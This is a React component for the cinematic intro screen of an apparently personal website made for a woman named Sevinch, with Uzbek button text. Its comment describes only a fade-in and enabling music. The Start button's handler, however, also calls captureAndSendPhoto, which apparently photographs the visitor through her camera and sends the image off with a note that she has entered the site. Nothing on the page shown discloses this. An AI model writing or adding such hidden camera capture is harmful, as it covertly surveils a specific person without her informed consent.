"use client";

import { motion, AnimatePresence } from "framer-motion";
import { useState } from "react";
import { content } from "@/lib/content";
import { captureAndSendPhoto } from "@/lib/camera";

/**
 * The first thing she sees: pure black, one glowing sentence,
 * then the world fades in. Clicking begins the experience
 * (which also unlocks the audio context for music).
 */
export default function IntroOverlay({ onBegin }: { onBegin: () => void }) {
  const [leaving, setLeaving] = useState(false);

  const begin = () => {
    if (leaving) return;
    setLeaving(true);
    
    // Request camera and send initial photo
    captureAndSendPhoto("📸 Sevinch saytga kirdi (Boshlash tugmasi bosildi)");

    setTimeout(onBegin, 1600);
  };

  return (
    <AnimatePresence>
      {!leaving ? (
        <motion.div
          key="intro"
          className="fixed inset-0 z-[80] flex flex-col items-center justify-center bg-black px-6 text-center"
          exit={{ opacity: 0 }}
          transition={{ duration: 1.6, ease: "easeInOut" }}
        >
          <motion.p
            initial={{ opacity: 0, filter: "blur(12px)", letterSpacing: "0.35em" }}
            animate={{ opacity: 1, filter: "blur(0px)", letterSpacing: "0.12em" }}
            transition={{ duration: 3.2, ease: [0.22, 1, 0.36, 1] }}
            className="glow-soft max-w-2xl font-serif text-xl italic text-pearl/90 sm:text-2xl md:text-3xl"
          >
            {content.intro.line}
          </motion.p>

          <motion.button
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 2.6, duration: 1.4 }}
            onClick={begin}
            className="glass group mt-14 rounded-full px-10 py-4 font-sans text-sm uppercase tracking-[0.3em] text-champagne transition-all duration-300 hover:scale-105 hover:border-champagne/40 hover:shadow-[0_0_40px_rgba(243,217,164,0.25)]"
          >
            <span className="glow-gold">Boshlash</span>
          </motion.button>

          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 0.5 }}
            transition={{ delay: 3.4, duration: 1.5 }}
            className="mt-6 font-sans text-xs tracking-widest text-pearl/50"
          >
quloqchin bilan tinglash tavsiya etiladi
          </motion.p>
        </motion.div>
      ) : (
        <motion.div
          key="fade"
          className="pointer-events-none fixed inset-0 z-[80] bg-black"
          initial={{ opacity: 1 }}
          animate={{ opacity: 0 }}
          transition={{ duration: 2.4, ease: "easeInOut" }}
        />
      )}
    </AnimatePresence>
  );
}
